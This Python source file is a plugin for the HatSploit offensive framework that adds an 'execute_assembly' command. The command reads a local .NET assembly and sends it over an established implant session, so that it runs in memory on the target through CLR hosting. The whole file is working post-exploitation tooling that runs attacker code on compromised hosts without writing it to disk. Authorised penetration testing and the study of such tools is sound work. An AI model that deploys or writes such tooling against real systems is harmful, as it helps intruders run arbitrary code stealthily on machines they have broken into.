"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from badges.cmd import Command

from pwny.api import *
from pwny.types import *

from hatsploit.lib.core.plugin import Plugin

EXECUTE_ASSEMBLY_BASE = 30

EXECUTE_ASSEMBLY_RUN = tlv_custom_tag(
    API_CALL_STATIC, EXECUTE_ASSEMBLY_BASE, API_CALL
)


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "Execute Assembly Plugin",
            'Plugin': "execute_assembly",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': "Execute a .NET assembly in-memory via CLR hosting.",
        })

        self.commands = [
            Command({
                'Category': "exploit",
                'Name': "execute_assembly",
                'Description': "Execute a .NET assembly in-memory via CLR hosting.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('file',),
                        {
                            'help': "Path to the local .NET assembly (.exe) file.",
                        }
                    ),
                    (
                        ('-a', '--args'),
                        {
                            'help': "Arguments to pass to the assembly entry point.",
                            'metavar': 'ARGS',
                            'default': '',
                        }
                    ),
                ]
            })
        ]

    def execute_assembly(self, args):
        try:
            with open(args.file, 'rb') as f:
                assembly = f.read()
        except Exception as e:
            self.print_error(f"Failed to read assembly: {e}")
            return

        if len(assembly) == 0:
            self.print_error("Assembly file is empty!")
            return

        self.print_process(
            f"Loading .NET assembly ({len(assembly)} bytes)..."
        )

        cmd_args = {
            TLV_TYPE_BYTES: assembly,
        }

        if args.args:
            cmd_args[TLV_TYPE_STRING] = args.args

        result = self.session.send_command(
            tag=EXECUTE_ASSEMBLY_RUN,
            plugin=self.plugin,
            args=cmd_args,
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error(
                "Assembly execution failed! Ensure the file is a valid "
                ".NET assembly and the CLR is available on the target."
            )
            return

        self.print_success("Assembly executed successfully.")

    def load(self):
        pass
